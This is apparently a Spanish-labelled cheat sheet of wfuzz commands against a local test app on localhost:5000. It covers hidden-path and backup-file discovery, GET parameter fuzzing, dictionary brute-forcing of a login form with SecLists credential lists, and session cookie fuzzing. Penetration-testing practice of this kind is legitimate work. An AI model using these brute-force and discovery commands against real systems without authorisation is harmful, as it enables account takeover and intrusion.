# Rutas Ocultas:
wfuzz -c -w SecLists/Discovery/Web-Content/common.txt -u http://localhost:5000/FUZZ --sc 200,403

# Descubrimiento de Archivos
wfuzz -c -w SecLists/Discovery/Web-Content/raft-small-files.txt -u http://localhost:5000/FUZZ.bak --sc 200

# Parámetros GET (en /api)
wfuzz -c -z file,SecLists/Discovery/Web-Content/burp-parameter-names.txt -u "http://localhost:5000/api?FUZZ=true" --sc 200

# Login con diccionarios
wfuzz -c -z file,users.txt -z file,passwords.txt -d "username=FUZZ&password=FUZ2Z" -u http://localhost:5000/login --hh 1046
wfuzz -c -z file,SecLists/Usernames/top-usernames-shortlist.txt -z file,SecLists/Passwords/Common-Credentials/10k-most-common.txt -d "username=FUZZ&password=FUZ2Z" -u http://localhost:5000/login --hh 1046

# Fuzzing de Cookies
wfuzz -c -z file,users.txt -H "Cookie: session=FUZZ" -u http://localhost:5000/dashboard --sc 200
